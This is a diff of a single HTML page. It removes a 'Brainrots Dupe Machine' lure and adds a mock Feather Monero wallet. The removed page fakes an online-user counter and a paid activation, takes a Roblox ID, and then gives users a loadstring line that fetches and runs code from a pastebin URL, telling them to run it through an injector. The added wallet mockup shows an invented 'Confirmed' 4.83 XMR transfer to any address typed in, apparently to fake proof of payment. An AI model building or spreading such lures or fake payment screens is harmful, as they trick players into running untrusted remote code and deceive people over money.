@@ -1,418 +1,643 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Zagolovok</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700;800&display=swap" rel="stylesheet">
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Feather Wallet Mockup</title>
   <style>
-    :root{
-      --bg:#000;
-      --text:#fff;
-      --muted:rgba(255,255,255,.70);
-      --muted2:rgba(255,255,255,.50);
-      --border:rgba(255,255,255,.16);
-      --border2:rgba(255,255,255,.22);
-      --panel1:rgba(255,255,255,.045);
-      --panel2:rgba(255,255,255,.02);
-      --shadow: 0 28px 70px rgba(0,0,0,.70);
-      --r:18px;
-      --green:#22c55e;
+    :root {
+      --bg: #efefef;
+      --panel: #f6f6f6;
+      --line: #d8d8d8;
+      --line-dark: #c8c8c8;
+      --text: #222;
+      --muted: #6a6a6a;
+      --white: #fff;
+      --tab: #ececec;
+      --tab-active: #f8f8f8;
+      --blue: #2c80d3;
+      --green: #6c9a3f;
+      --orange: #d8852f;
     }
 
-    *{ box-sizing:border-box; }
-    html,body{ height:100%; }
-    body{
-      margin:0;
-      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      padding: 0;
       background: var(--bg);
+      font-family: "Segoe UI", Tahoma, Arial, sans-serif;
       color: var(--text);
+      height: 100%;
     }
 
-    .wrap{
-      min-height:100%;
-      display:grid;
-      place-items:center;
-      padding: 28px;
+    .window {
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: var(--bg);
+      border: 1px solid #cfcfcf;
     }
 
-    .stack{
-      width:min(680px, 100%);
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-      gap:14px;
+    .titlebar {
+      height: 30px;
+      display: flex;
+      align-items: center;
+      padding: 0 10px;
+      background: #f3f3f3;
+      border-bottom: 1px solid #dddddd;
+      font-size: 14px;
+      user-select: none;
     }
 
-    .pageTitle{
-      margin:0;
-      font-size: 40px;
-      line-height: 1.05;
-      letter-spacing: -0.9px;
-      font-weight: 800;
-      text-align:center;
-    }
-
-    .box{
-      width:100%;
-      border-radius: var(--r);
-      border: 1px solid var(--border);
-      background: linear-gradient(180deg, var(--panel1), var(--panel2));
-      box-shadow: var(--shadow);
-      padding: 22px;
-      position:relative;
-      overflow:hidden;
-    }
-
-    .online{
-      position:absolute;
-      top: 14px;
-      right: 14px;
-      display:flex;
-      align-items:center;
-      gap:10px;
-      padding: 8px 10px;
-      border-radius: 999px;
-      border: 1px solid rgba(255,255,255,.12);
-      background: rgba(255,255,255,.02);
-      font-size: 12px;
-      font-weight: 800;
-      color: rgba(255,255,255,.86);
-      user-select:none;
-    }
-
-    .dot{
-      width: 10px;
-      height: 10px;
-      border-radius: 999px;
-      background: var(--green);
-      box-shadow: 0 0 0 6px rgba(34,197,94,.10);
-    }
-
-    .onlineText{
-      color: rgba(255,255,255,.78);
-      font-weight: 800;
-      letter-spacing: .2px;
-      display:flex;
-      align-items:baseline;
-      gap:6px;
-    }
-    .onlineText b{
-      color: rgba(255,255,255,.92);
-      font-weight: 900;
-      font-size: 12px;
-    }
-
-    .price{
-      margin: 22px 0 18px;
-      display:flex;
-      flex-direction:column;
-      gap:6px;
-      text-align:left;
-    }
-    .priceMain{
-      font-size: 30px;
-      font-weight: 900;
-      letter-spacing: -0.6px;
-      color: rgba(255,255,255,.96);
-      line-height: 1.1;
-    }
-    .priceSub{
-      font-size: 13px;
-      font-weight: 700;
-      color: rgba(255,255,255,.70);
-    }
-
-    .hold{
-      width:100%;
-      height: 56px;
-      border-radius: 14px;
-      border: 1px solid var(--border2);
-      background: rgba(255,255,255,.03);
-      color: rgba(255,255,255,.92);
-      cursor: pointer;
+    .titlebar .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #f3923d, #c24d28);
+      margin-right: 8px;
       position: relative;
-      overflow:hidden;
-      outline:none;
-      transform: translateZ(0);
-      transition: transform .12s ease, border-color .12s ease, background .12s ease;
-      user-select:none;
-      -webkit-tap-highlight-color: transparent;
+      box-shadow: inset 0 0 0 1px rgba(0,0,0,.12);
     }
-    .hold:active{ transform: translateY(1px); }
-    .hold[disabled]{ opacity:.70; cursor:default; }
 
-    .hold__fill{
-      position:absolute;
-      inset:0;
-      width:0%;
-      background: rgba(255,255,255,.14);
-      transition: width 0.06s linear;
+    .titlebar .title {
+      flex: 1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
-    .hold__text{
-      position:relative;
-      z-index:1;
-      font-weight: 900;
-      letter-spacing: .2px;
+
+    .titlebar .winbtns {
+      display: flex;
+      gap: 16px;
+      color: #111;
+      font-size: 18px;
+      line-height: 1;
+    }
+
+    .menubar {
+      height: 28px;
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      padding: 0 16px;
+      border-bottom: 1px solid #dddddd;
+      background: #f7f7f7;
+      font-size: 14px;
+      user-select: none;
+    }
+
+    .toolbar {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 8px;
+      border-bottom: 1px solid #dcdcdc;
+      background: #f3f3f3;
+      flex-wrap: wrap;
+    }
+
+    .tooltab {
+      border: 1px solid var(--line);
+      background: linear-gradient(#fafafa, #ececec);
+      border-radius: 4px;
+      min-width: 82px;
+      height: 30px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 0 12px;
+      cursor: pointer;
+      color: #2f2f2f;
       font-size: 14px;
     }
 
-    .divider{
-      margin: 16px 0;
-      height:1px;
-      background: rgba(255,255,255,.10);
-      border:0;
+    .tooltab.active {
+      background: linear-gradient(#ffffff, #f1f1f1);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,.9);
     }
 
-    .row{
-      display:flex;
+    .icon {
+      width: 14px;
+      height: 14px;
+      display: inline-block;
+      position: relative;
+      flex: 0 0 14px;
+    }
+
+    .icon.home::before { content: "🏠"; font-size: 13px; position: absolute; inset: -1px 0 0 0; }
+    .icon.history::before { content: "🕘"; font-size: 13px; position: absolute; inset: -1px 0 0 0; }
+    .icon.send::before { content: "✈️"; font-size: 12px; position: absolute; inset: -1px 0 0 0; }
+    .icon.receive::before { content: "📥"; font-size: 12px; position: absolute; inset: -1px 0 0 0; }
+    .icon.calc::before { content: "🧮"; font-size: 12px; position: absolute; inset: -1px 0 0 0; }
+
+    .content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      min-height: 0;
+      background: var(--bg);
+    }
+
+    .page {
+      display: none;
+      flex: 1;
+      padding: 12px;
+    }
+
+    .page.active {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .row {
+      display: grid;
+      grid-template-columns: 58px 1fr auto;
       gap: 10px;
-      align-items:center;
+      align-items: center;
+      margin-bottom: 10px;
     }
 
-    .input{
-      flex:1;
-      height: 54px;
-      border-radius: 14px;
-      border: 1px solid var(--border);
-      background: rgba(255,255,255,.02);
-      color: rgba(255,255,255,.92);
-      padding: 0 14px;
+    .row.amount {
+      grid-template-columns: 58px 135px 60px 72px auto;
+      max-width: 520px;
+    }
+
+    label {
       font-size: 14px;
-      outline:none;
-      transition: border-color .12s ease, background .12s ease;
-    }
-    .input:focus{
-      border-color: rgba(255,255,255,.30);
-      background: rgba(255,255,255,.03);
+      color: #222;
     }
 
-    .btn{
-      height: 54px;
-      padding: 0 18px;
-      border-radius: 14px;
-      border: 1px solid rgba(255,255,255,.22);
-      background: rgba(255,255,255,.08);
-      color: rgba(255,255,255,.92);
-      font-weight: 900;
-      cursor:pointer;
-      transition: transform .12s ease, filter .12s ease, background .12s ease, border-color .12s ease;
-      -webkit-tap-highlight-color: transparent;
+    input[type="text"],
+    input[type="number"],
+    textarea,
+    select {
+      width: 100%;
+      height: 26px;
+      border: 1px solid var(--line);
+      background: var(--panel);
+      border-radius: 4px;
+      padding: 4px 8px;
+      font-size: 14px;
+      color: #333;
+      outline: none;
     }
-    .btn:hover{ filter: brightness(1.08); border-color: rgba(255,255,255,.30); }
-    .btn:active{ transform: translateY(1px); }
 
-    .out{
-      margin-top: 14px;
-      border-radius: 14px;
-      border: 1px solid var(--border);
-      background: rgba(255,255,255,.02);
-      padding: 12px 14px;
-      /* ВАЖНО: НЕ режем высоту */
-      overflow: visible;
+    textarea {
+      min-height: 90px;
+      resize: vertical;
+      padding-top: 8px;
     }
-    .out__label{
-      font-size: 12px;
-      color: var(--muted2);
-      margin-bottom: 8px;
-      letter-spacing:.6px;
-      text-transform: uppercase;
-      font-weight: 800;
+
+    input::placeholder { color: #8a8a8a; }
+
+    .btn {
+      height: 26px;
+      min-width: 72px;
+      border: 1px solid var(--line);
+      background: linear-gradient(#fafafa, #ebebeb);
+      border-radius: 5px;
+      font-size: 14px;
+      color: #222;
+      cursor: pointer;
+      padding: 0 12px;
     }
-    .out__value{
-      display:block;
-      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+
+    .btn:active { transform: translateY(1px); }
+
+    .spacer { flex: 1; }
+
+    .home-actions {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+      margin-top: 4px;
+    }
+
+    .home-blank {
+      flex: 1;
+      border-radius: 2px;
+      background: transparent;
+    }
+
+    .section-title {
+      font-size: 15px;
+      margin: 0 0 10px;
+      font-weight: 600;
+      color: #2c2c2c;
+    }
+
+    .history-list {
+      border: 1px solid var(--line);
+      background: #f7f7f7;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .history-head,
+    .history-item {
+      display: grid;
+      grid-template-columns: 170px 1fr 130px 120px;
+      gap: 12px;
+      align-items: center;
+      padding: 10px 12px;
+      font-size: 14px;
+    }
+
+    .history-head {
+      background: #ececec;
+      border-bottom: 1px solid var(--line);
+      font-weight: 600;
+    }
+
+    .history-item {
+      background: #fafafa;
+      border-bottom: 1px solid #e9e9e9;
+    }
+
+    .history-item:last-child { border-bottom: 0; }
+
+    .amount-out { color: #8c2020; font-weight: 600; }
+    .status-ok { color: #2b7d2b; font-weight: 600; }
+
+    .receive-box,
+    .calc-box,
+    .home-box {
+      border: 1px solid var(--line);
+      background: #f7f7f7;
+      border-radius: 4px;
+      padding: 14px;
+      max-width: 760px;
+    }
+
+    .address {
+      font-family: Consolas, monospace;
       font-size: 13px;
-      color: rgba(255,255,255,.92);
-
-      /* показываем полностью */
-      white-space: normal;
-      overflow-wrap: anywhere;
-      word-break: break-word;
-      line-height: 1.55;
+      background: #f1f1f1;
+      border: 1px solid var(--line);
+      padding: 10px;
+      border-radius: 4px;
+      word-break: break-all;
+      margin: 10px 0 12px;
+      color: #555;
     }
 
-    .note{
-      margin-top: 14px;
-      font-size: 13px;
-      line-height: 1.7;
+    .qr {
+      width: 150px;
+      height: 150px;
+      background:
+        linear-gradient(90deg, #000 10px, transparent 10px) 0 0/30px 30px,
+        linear-gradient(#000 10px, transparent 10px) 0 0/30px 30px,
+        linear-gradient(90deg, #000 5px, transparent 5px) 15px 15px/30px 30px,
+        linear-gradient(#000 5px, transparent 5px) 15px 15px/30px 30px,
+        #fff;
+      border: 8px solid #fff;
+      box-shadow: 0 0 0 1px var(--line);
+      margin-bottom: 12px;
+    }
+
+    .calc-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 72px);
+      gap: 8px;
+      margin-top: 12px;
+    }
+
+    .calc-display {
+      width: 100%;
+      height: 42px;
+      font-size: 20px;
+      text-align: right;
+      padding: 8px 10px;
+      border: 1px solid var(--line);
+      background: #fcfcfc;
+      border-radius: 4px;
+    }
+
+    .calc-btn {
+      height: 42px;
+      border: 1px solid var(--line-dark);
+      background: linear-gradient(#fafafa, #e9e9e9);
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .home-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(180px, 1fr));
+      gap: 12px;
+    }
+
+    .stat {
+      background: #fcfcfc;
+      border: 1px solid var(--line);
+      border-radius: 4px;
+      padding: 12px;
+    }
+
+    .stat .k {
       color: var(--muted);
-      border-top: 1px solid rgba(255,255,255,.10);
-      padding-top: 12px;
+      font-size: 13px;
+      margin-bottom: 6px;
     }
 
-    .hidden{ display:none; }
+    .stat .v {
+      font-size: 22px;
+      font-weight: 600;
+    }
 
-    @media (max-width: 560px){
-      .row{ flex-direction:column; align-items:stretch; }
-      .btn{ width:100%; }
-      .pageTitle{ font-size: 36px; }
-      .priceMain{ font-size: 26px; }
+    .statusbar {
+      height: 26px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      padding: 0 8px 0 2px;
+      border-top: 1px solid #d8d8d8;
+      background: #f4f4f4;
+      font-size: 12px;
+      color: #222;
+      user-select: none;
+    }
+
+    .status-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .status-icons {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #6b6b6b;
+      font-size: 16px;
+    }
+
+    @media (max-width: 900px) {
+      .history-head,
+      .history-item {
+        grid-template-columns: 1fr;
+      }
+
+      .row,
+      .row.amount {
+        grid-template-columns: 1fr;
+        max-width: none;
+      }
+
+      .home-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .calc-grid {
+        grid-template-columns: repeat(4, 1fr);
+      }
     }
   </style>
 </head>
-
 <body>
-  <main class="wrap">
-    <div class="stack">
-      <h1 class="pageTitle">Brainrots Dupe Machine</h1>
+  <div class="window">
+    <div class="titlebar">
+      <div class="dot"></div>
+      <div class="title">wallet_1 (#0) - Feather</div>
+      <div class="winbtns"><span>–</span><span>□</span><span>×</span></div>
+    </div>
 
-      <!-- FIXED LINK: меняй тут -->
-      <section class="box" id="app" data-fixed-link='loadstring(game:HttpGet("https://pastebin.com/raw/kguPGCJu"))()'>
-        <div class="online" aria-label="Online">
-          <span class="dot" aria-hidden="true"></span>
-          <span class="onlineText"><b id="onlineNum">—</b> online</span>
+    <div class="menubar">
+      <span>File</span>
+      <span>Wallet</span>
+      <span>View</span>
+      <span>Tools</span>
+      <span>Help</span>
+    </div>
+
+    <div class="toolbar">
+      <button class="tooltab active" data-page="home"><span class="icon home"></span><span>Home</span></button>
+      <button class="tooltab" data-page="history"><span class="icon history"></span><span>History</span></button>
+      <button class="tooltab" data-page="send"><span class="icon send"></span><span>Send</span></button>
+      <button class="tooltab" data-page="receive"><span class="icon receive"></span><span>Receive</span></button>
+      <button class="tooltab" data-page="calc"><span class="icon calc"></span><span>Calc</span></button>
+    </div>
+
+    <div class="content">
+      <section class="page active" id="page-home">
+        <div class="row">
+          <label>Pay to</label>
+          <input type="text" placeholder="Paste address, payment URI, OpenAlias, or QR code" />
+          <button class="btn">📷 Scan</button>
+        </div>
+        <div class="row">
+          <label>Description</label>
+          <input type="text" />
+          <div></div>
+        </div>
+        <div class="row amount">
+          <label>Amount</label>
+          <input type="text" />
+          <select>
+            <option>XMR</option>
+            <option>mXMR</option>
+            <option>USD</option>
+          </select>
+          <button class="btn">Max</button>
+          <div></div>
         </div>
 
-        <div class="price">
-          <div class="priceMain">$70 / day</div>
-          <div class="priceSub">2 days free</div>
+        <div class="home-actions">
+          <button class="btn">Clear</button>
+          <button class="btn">Send</button>
         </div>
 
-        <button class="hold" id="holdBtn" type="button">
-          <span class="hold__fill" id="holdFill"></span>
-          <span class="hold__text" id="holdText">Hold 3s to activate</span>
-        </button>
+        <div class="home-blank"></div>
+      </section>
 
-        <hr class="divider" />
-
-        <div id="unlocked" class="hidden">
-          <div class="row">
-            <input class="input" id="idInput" type="text" placeholder="Roblox ID" autocomplete="off" />
-            <button class="btn" id="genBtn" type="button">Generate</button>
+      <section class="page" id="page-history">
+        <h3 class="section-title">Transaction History</h3>
+        <div class="history-list">
+          <div class="history-head">
+            <div>Date</div>
+            <div>Details</div>
+            <div>Amount</div>
+            <div>Status</div>
           </div>
-
-          <div class="out hidden" id="outWrap">
-            <div class="out__label">Link</div>
-            <div class="out__value" id="linkOut">""</div>
+          <div class="history-item">
+            <div>2026-03-29 14:22</div>
+            <div>Sent to wallet (<span id="walletPlaceholder">вставь адрес</span>)</div>
+            <div class="amount-out">-4.83 XMR</div>
+            <div class="status-ok">Confirmed</div>
           </div>
+        </div>
+      </section>
 
-          <div class="note">Paste the link into the injector and run it.<br/>Farm Brainrots automatically with our script</div>
+      <section class="page" id="page-send">
+        <div class="row">
+          <label>Pay to</label>
+          <input id="sendAddress" type="text" placeholder="Paste address, payment URI, OpenAlias, or QR code" />
+          <button class="btn">📷 Scan</button>
+        </div>
+        <div class="row">
+          <label>Description</label>
+          <input id="sendDescription" type="text" placeholder="Optional note" />
+          <div></div>
+        </div>
+        <div class="row amount">
+          <label>Amount</label>
+          <input id="sendAmount" type="text" value="4.83" />
+          <select id="sendCurrency">
+            <option selected>XMR</option>
+            <option>mXMR</option>
+            <option>USD</option>
+          </select>
+          <button class="btn" id="fillMax">Max</button>
+          <div></div>
+        </div>
+        <div class="home-actions">
+          <button class="btn" id="clearSend">Clear</button>
+          <button class="btn" id="fakeSend">Send</button>
+        </div>
+        <div class="receive-box" style="margin-top: 14px; max-width: 860px;">
+          <div class="section-title" style="margin:0 0 8px; font-size:14px; font-weight:500;">Mock panel</div>
+          <div style="font-size:14px; color:#444;">Кнопки рабочие. Это только фронт. Никаких реальных переводов нет.</div>
+        </div>
+      </section>
+
+      <section class="page" id="page-receive">
+        <div class="receive-box">
+          <h3 class="section-title">Receive</h3>
+          <div class="qr"></div>
+          <div class="address">48A1xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx</div>
+          <div style="display:flex; gap:10px; flex-wrap:wrap;">
+            <button class="btn" id="copyAddress">Copy Address</button>
+            <button class="btn" id="newSubaddress">New Subaddress</button>
+          </div>
+        </div>
+      </section>
+
+      <section class="page" id="page-calc">
+        <div class="calc-box">
+          <h3 class="section-title">Calculator</h3>
+          <input class="calc-display" id="calcDisplay" type="text" value="0" readonly />
+          <div class="calc-grid">
+            <button class="calc-btn">7</button>
+            <button class="calc-btn">8</button>
+            <button class="calc-btn">9</button>
+            <button class="calc-btn">/</button>
+            <button class="calc-btn">4</button>
+            <button class="calc-btn">5</button>
+            <button class="calc-btn">6</button>
+            <button class="calc-btn">*</button>
+            <button class="calc-btn">1</button>
+            <button class="calc-btn">2</button>
+            <button class="calc-btn">3</button>
+            <button class="calc-btn">-</button>
+            <button class="calc-btn">0</button>
+            <button class="calc-btn">.</button>
+            <button class="calc-btn">=</button>
+            <button class="calc-btn">+</button>
+            <button class="calc-btn" style="grid-column: span 4;">C</button>
+          </div>
         </div>
       </section>
     </div>
-  </main>
+
+    <div class="statusbar">
+      <div>Wallet sync: 33097 blocks remaining&nbsp; (D: 5031.5 KB)</div>
+      <div class="status-right">
+        <div>Balance: 0 XMR</div>
+        <div class="status-icons"><span>🔄</span><span>🧑‍🤝‍🧑</span><span>🔒</span><span>🛠️</span><span>💸</span><span>💡</span></div>
+      </div>
+    </div>
+  </div>
 
   <script>
-    (() => {
-      const app = document.getElementById("app");
-      const FIXED_LINK = (app.dataset.fixedLink || '""').trim();
+    const tabs = document.querySelectorAll('.tooltab');
+    const pages = document.querySelectorAll('.page');
 
-      const onlineEl = document.getElementById("onlineNum");
-      const MIN = 350, MAX = 450;
+    function openPage(name) {
+      tabs.forEach(tab => tab.classList.toggle('active', tab.dataset.page === name));
+      pages.forEach(page => page.classList.toggle('active', page.id === 'page-' + name));
+    }
 
-      let current = Math.floor(MIN + Math.random() * (MAX - MIN + 1));
-      let target = current;
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => openPage(tab.dataset.page));
+    });
 
-      function clamp(n, a, b){ return Math.max(a, Math.min(b, n)); }
+    const clearSend = document.getElementById('clearSend');
+    const fakeSend = document.getElementById('fakeSend');
+    const fillMax = document.getElementById('fillMax');
+    const sendAddress = document.getElementById('sendAddress');
+    const sendDescription = document.getElementById('sendDescription');
+    const sendAmount = document.getElementById('sendAmount');
+    const walletPlaceholder = document.getElementById('walletPlaceholder');
 
-      function pickTarget(){
-        const jump = Math.random() < 0.12;
-        const step = jump ? (10 + Math.floor(Math.random()*18)) : (1 + Math.floor(Math.random()*5));
-        const dir = Math.random() < 0.5 ? -1 : 1;
-        target = clamp(current + dir * step, MIN, MAX);
+    clearSend?.addEventListener('click', () => {
+      sendAddress.value = '';
+      sendDescription.value = '';
+      sendAmount.value = '';
+    });
+
+    fillMax?.addEventListener('click', () => {
+      sendAmount.value = '4.83';
+    });
+
+    fakeSend?.addEventListener('click', () => {
+      const addr = sendAddress.value.trim();
+      if (addr) walletPlaceholder.textContent = addr;
+      openPage('history');
+    });
+
+    const copyAddress = document.getElementById('copyAddress');
+    copyAddress?.addEventListener('click', async () => {
+      const address = document.querySelector('.address').textContent.trim();
+      try {
+        await navigator.clipboard.writeText(address);
+        copyAddress.textContent = 'Copied';
+        setTimeout(() => copyAddress.textContent = 'Copy Address', 1200);
+      } catch {
+        copyAddress.textContent = 'Copy failed';
+        setTimeout(() => copyAddress.textContent = 'Copy Address', 1200);
       }
+    });
 
-      function tickOnline(){
-        if (target === current) pickTarget();
+    const newSubaddress = document.getElementById('newSubaddress');
+    newSubaddress?.addEventListener('click', () => {
+      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789';
+      let str = '4';
+      for (let i = 0; i < 94; i++) str += chars[Math.floor(Math.random() * chars.length)];
+      document.querySelector('.address').textContent = str;
+    });
 
-        const diff = target - current;
-        const move = diff === 0 ? 0 : (Math.abs(diff) >= 8 ? Math.sign(diff) * 2 : Math.sign(diff));
-        current = clamp(current + move, MIN, MAX);
+    const calcDisplay = document.getElementById('calcDisplay');
+    const calcButtons = document.querySelectorAll('.calc-btn');
+    let calcExpr = '';
 
-        onlineEl.textContent = String(current);
-
-        const next = 180 + Math.floor(Math.random()*260);
-        setTimeout(tickOnline, next);
-      }
-
-      onlineEl.textContent = String(current);
-      setTimeout(tickOnline, 220);
-
-      const holdBtn = document.getElementById("holdBtn");
-      const holdFill = document.getElementById("holdFill");
-      const holdText = document.getElementById("holdText");
-
-      const unlocked = document.getElementById("unlocked");
-      const idInput = document.getElementById("idInput");
-      const genBtn = document.getElementById("genBtn");
-
-      const outWrap = document.getElementById("outWrap");
-      const linkOut = document.getElementById("linkOut");
-
-      const HOLD_MS = 3000;
-
-      let activated = false;
-      let holding = false;
-      let t0 = 0;
-      let raf = 0;
-
-      function setFill(pct){ holdFill.style.width = pct + "%"; }
-
-      function unlock(){
-        activated = true;
-        holdBtn.disabled = true;
-        holdText.textContent = "Activated";
-        setFill(100);
-        unlocked.classList.remove("hidden");
-        idInput.focus();
-      }
-
-      function stopHold(){
-        if (!holding) return;
-        holding = false;
-        cancelAnimationFrame(raf);
-
-        if (!activated){
-          setFill(0);
-          holdText.textContent = "Hold 3s to activate";
-        }
-      }
-
-      function tick(now){
-        if (!holding) return;
-
-        const dt = now - t0;
-        const pct = Math.min(100, (dt / HOLD_MS) * 100);
-        setFill(pct);
-
-        if (dt >= HOLD_MS){
-          holding = false;
-          unlock();
+    calcButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        const val = btn.textContent;
+        if (val === 'C') {
+          calcExpr = '';
+          calcDisplay.value = '0';
           return;
         }
-
-        const left = Math.max(1, Math.ceil((HOLD_MS - dt) / 1000));
-        holdText.textContent = "Hold " + left + "s";
-        raf = requestAnimationFrame(tick);
-      }
-
-      function startHold(){
-        if (activated) return;
-        holding = true;
-        t0 = performance.now();
-        raf = requestAnimationFrame(tick);
-      }
-
-      holdBtn.addEventListener("mousedown", startHold);
-      holdBtn.addEventListener("touchstart", (e) => { e.preventDefault(); startHold(); }, { passive:false });
-
-      window.addEventListener("mouseup", stopHold);
-      window.addEventListener("touchend", stopHold);
-      window.addEventListener("touchcancel", stopHold);
-      holdBtn.addEventListener("mouseleave", stopHold);
-
-      genBtn.addEventListener("click", () => {
-        if (!activated) return;
-        const id = (idInput.value || "").trim();
-        if (!id) { idInput.focus(); return; }
-        linkOut.textContent = FIXED_LINK || '""';
-        outWrap.classList.remove("hidden");
+        if (val === '=') {
+          try {
+            calcExpr = String(Function('return (' + calcExpr + ')')());
+            calcDisplay.value = calcExpr;
+          } catch {
+            calcExpr = '';
+            calcDisplay.value = 'Error';
+            setTimeout(() => calcDisplay.value = '0', 900);
+          }
+          return;
+        }
+        calcExpr += val;
+        calcDisplay.value = calcExpr || '0';
       });
-    })();
+    });
   </script>
 </body>
 </html>
